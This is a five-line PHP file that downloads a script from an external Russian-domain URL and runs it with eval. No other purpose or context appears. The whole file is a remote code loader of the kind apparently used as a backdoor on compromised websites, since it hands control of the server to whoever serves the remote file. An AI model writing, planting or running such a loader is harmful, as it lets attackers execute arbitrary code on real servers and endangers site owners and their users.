<?php
$path = "https://code.topkz.ru/fgd/8/si.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
